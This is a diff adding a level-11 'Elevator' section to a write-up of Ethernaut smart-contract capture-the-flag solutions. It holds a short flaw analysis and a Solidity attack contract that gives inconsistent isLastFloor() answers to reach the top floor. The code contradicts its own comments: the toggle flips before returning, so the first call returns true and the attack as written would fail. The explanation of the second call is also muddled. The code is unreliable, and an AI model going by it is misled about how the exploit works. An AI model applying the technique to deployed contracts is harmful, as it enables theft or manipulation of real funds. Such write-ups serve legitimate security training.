@@ -389,3 +389,44 @@ contract ReentrancyAttacker {
 **Steps to attack:**
 - Deploy the contract using remix
 - call the `attack()` function.
+
+---
+
+# 11: Elevator
+**Level Link:** [Elevator Challenge](https://ethernaut.openzeppelin.com/level/11)  
+**Vulnerability:** Interface implementation deception  
+**Objective:** Manipulate the elevator to reach the top floor  
+**Vulnerability Analysis:**  
+The Elevator contract calls isLastFloor() twice in the same transaction. We exploit this by making it return false on the first call (to enter the if block) and true on the second call (to satisfy the final check). This works because:
+- First Call: Returns false → if (!false) succeeds → updates currentFloor
+- Second Call: Returns true → lets the state change persist  
+
+The attack succeeds because the contract doesn't verify if isLastFloor() gives consistent responses within a single transaction.  
+**Attack Contract:**
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IElevator {
+    function goTo(uint _floor) external;
+}
+
+contract FakeBuilding {
+    bool private toggle;
+    IElevator public elevator;
+
+    constructor(address _elevator) {
+        elevator = IElevator(_elevator);
+    }
+
+    function isLastFloor(uint) external returns (bool) {
+        toggle = !toggle;
+        return toggle; // First call: false, Second call: true
+    }
+
+    function attack(uint floor) public {
+        elevator.goTo(floor);
+    }
+}
+```
+
